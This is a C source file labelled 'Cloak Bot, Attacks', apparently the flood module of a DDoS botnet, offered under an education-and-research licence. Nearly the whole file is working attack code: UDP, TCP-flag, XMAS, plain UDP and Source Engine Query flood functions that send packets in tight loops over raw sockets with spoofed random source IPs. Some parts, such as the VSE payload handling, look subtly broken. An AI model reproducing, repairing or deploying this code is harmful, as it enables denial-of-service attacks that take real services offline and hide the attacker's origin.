/*
    Permission To Use, Copy, Modify, And Distribute This Ware And Its Documentation For Education And Research, Without Fee Or A Signed Agreement, Is Granted,-
    Provided That This And The Following Two Paragraphs Appear In All Copies, Modifications, And Distributions. (Feb. 2020)

    This Ware Is Offered As-Is and As-Available, And Makes No Representations Or Warranties Of Any Kind Concerning This Material, Whether Express, Implied, Statutory, Or Other.
    This Includes, Without Limitation, Warranties Of Title, Merchantability, Fitness For A Particular Purpose, Non-Infringement, Absence Of Latent Or Other Defects, Accuracy,-
     Or The Presence Or Absence Of Errors, Whether Or Not Known Or Discoverable.

    To The Extent Possible, In No Event Shall The Author Be Liable To You On Any Legal Theory-
    (Including, Without Limitation, Negligence) Or Otherwise For Any Direct, Indirect, Special, Incidental, Consequential, Punitive, Exemplary,-
     Or Any Other Losses, Costs, Expenses, Or Damages (Including, But Not Limited To, Loss Of Use, Data, Profits, Or Business Interruption)-
    However Caused, And On Any Theory Of Liability, Whether In Contract, Strict Liability, Or Tort (Including Negligence Or Otherwise) Arising Out Of This Public Release-
     Or Use Of This Ware, Even If The User Has Been Advised Of The Possibility Of Such Losses, Costs, Expenses, Or Damages.
    
*/
//Cloak Bot, Attacks
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <unistd.h>
#include "attack_methods.h"
#define PHI 0x9e3779b9
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

int getip(unsigned char *toGet, struct in_addr *i);
typedef char BOOL;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;
static uint32_t x, y, z, w;
uint32_t scanPid;
struct in_addr ourIP;
ipv4_t LOCAL_ADDR;
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x){
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
void rand_init(void){
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}
uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c){ x++; c++; }
    return (Q[i] = r - x);
}
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len){
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1){ sum += *buf; buf++; len -= 2; }
    if (len == 1) sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void makeRandomStr(unsigned char *buf, int length){
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}
uint32_t rand_next(void){
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y;
    y = z;
    z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
in_addr_t getRandomIP(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short *buf, int count){
    register uint64_t sum = 0;
    while(count > 1){ sum += *buf++; count -= 2; }
    if(count > 0) sum += *(unsigned char *)buf;
    while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph){
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}
void udp_flood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd) return;
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister) {
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd) return;
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;
        int counter = 50;
        while(counter--) {
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( getRandomIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister) {
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck) {
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void tcp_flood(unsigned char *target, int port, int timeEnd, unsigned char *flags){
    int packetsize = 2500;
    int pollinterval = 10;
    int spoofit = 32;
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) return;
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;
    in_addr_t netmask;
    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    if(!strcmp(flags, "all")) {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    } else {
        unsigned char *pch = strtok(flags, ",");
        while(pch) {
            if(!strcmp(pch,         "syn")) {
                tcph->syn = 1;
            } else if(!strcmp(pch,  "rst")) {
                tcph->rst = 1;
            } else if(!strcmp(pch,  "fin")) {
                tcph->fin = 1;
            } else if(!strcmp(pch,  "ack")) {
                tcph->ack = 1;
            } else if(!strcmp(pch,  "psh")) {
                tcph->psh = 1;
            } else {
            }
            pch = strtok(NULL, ",");
        }
    }
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1){
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        if(i == pollRegister){
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}
void std_flood(unsigned char *target, int port, int duration){
    int psize = 1024;
    char *data = malloc(1024);
    struct sockaddr_in hubnr;
    int mysock = socket(AF_INET, SOCK_DGRAM, 0); 
    hubnr.sin_family = AF_INET;
    hubnr.sin_addr.s_addr = inet_addr(target);
    hubnr.sin_port = htons(port);
    time_t start = time(NULL);
    while(time(NULL) != start + duration){   
        data[psize] = (char)((rand() % 70) + 30);
        connect(mysock, (struct sockaddr *)&hubnr, sizeof(hubnr));
        send(mysock, data, psize, 0); 
    }
}
void xmas_flood(unsigned char *target, int port, int timeEnd){
    int spoofit = 32;
    int packetsize = 0;
    int pollinterval = 10;
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) return;
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;
    in_addr_t netmask;
    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 1;
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while(1){
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        if(i == pollRegister){
            if(time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void vse_flood(unsigned char *target, int port, int timeEnd){
	int spoofit = 32;
	int packetsize = 1024;
	int pollinterval = 10;
	int sleepcheck = 0;
	int sleeptime = 0;
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd) return;
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd) return;
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) return;
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( getRandomIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
